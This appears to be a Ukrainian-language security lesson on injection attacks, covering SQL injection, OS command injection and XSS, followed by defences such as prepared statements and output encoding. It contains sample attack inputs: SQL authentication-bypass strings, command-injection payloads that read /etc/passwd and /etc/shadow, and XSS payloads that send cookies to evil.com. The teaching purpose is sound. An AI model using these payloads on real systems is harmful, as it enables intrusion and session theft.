Ін'єкції: принцип атаки

Ін'єкція — коли ненадійні дані надсилаються до інтерпретатора як частина команди або запиту. Атакуючий "впорскує" свій код, який виконується сервером.

SQL Injection — найнебезпечніша ін'єкція

SQL Injection дозволяє читати, модифікувати та видаляти дані з бази. У найгіршому випадку — виконати команди ОС на сервері.

Типи SQLi

  • Error-based — помилки SQL розкривають дані
  • UNION-based — додавання SELECT через UNION
  • Blind Boolean — true/false відповіді
  • Blind Time-based — затримки (SLEEP)
  • Second-order — збережені дані → пізніше виконуються
  • Out-of-band — дані надсилаються на зовнішній сервер (DNS/HTTP)
# Вразливий запит (PHP):
$query = "SELECT * FROM users
  WHERE id = '$_GET[id]'";

# Нормальний запит:
GET /user?id=1
→ SELECT * FROM users WHERE id = '1'

# Атака:
GET /user?id=1' OR '1'='1
→ SELECT * FROM users WHERE id = '1' OR '1'='1'
# Повертає ВСІ записи!

# Обхід автентифікації:
login: admin' --
password: будь-що
→ SELECT * FROM users WHERE
  username='admin'--' AND password='...'

Command Injection та XSS

OS Command Injection (CWE-78)

Виконання команд ОС через вразливий додаток

# Вразливий код (PHP):
system("ping -c 4 " . $_GET['host']);

# Атака — ін'єкція через метасимволи:
GET /ping?host=8.8.8.8; cat /etc/passwd
GET /ping?host=8.8.8.8 | whoami
GET /ping?host=8.8.8.8 && id
GET /ping?host=`id`
GET /ping?host=$(cat /etc/shadow)

Метасимволи shell: ; | && || ` $()

XSS — Cross-Site Scripting (CWE-79)

  • Reflected: payload у URL → відображається на сторінці
  • Stored: payload зберігається у БД → виконується для всіх
  • DOM-based: маніпуляція DOM без серверної участі
# Reflected XSS
https://site.com/search?q=<script>
  document.location='https://evil.com/
  steal?c='+document.cookie</script>

# Stored XSS (коментар у блозі)
<img src=x onerror="fetch('https://evil.com/
  ?c='+document.cookie)">
XSS = крадіжка сесій, keylogging, дефейс, фішинг, криптомайнінг у браузері жертви.

Захист від ін'єкцій

SQL Injection

Параметризовані запити (prepared statements):

# Python (безпечно)
cursor.execute(
  "SELECT * FROM users WHERE id = %s",
  (user_id,))

# PHP PDO (безпечно)
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
  • ORM (SQLAlchemy, Hibernate)
  • Input validation (whitelist)

Command Injection

  • Уникати виклику shell! Використовувати бібліотеки
  • Whitelist допустимих значень
  • Ніколи не конкатенувати user input у команди
  • Якщо shell необхідний: escapeshellarg() / shlex.quote()

XSS

  • Output encoding (HTML entities)
  • Content-Security-Policy header
  • HttpOnly cookies (заборона JS доступу)
  • Sanitize HTML input (DOMPurify)
  • Не використовувати innerHTML
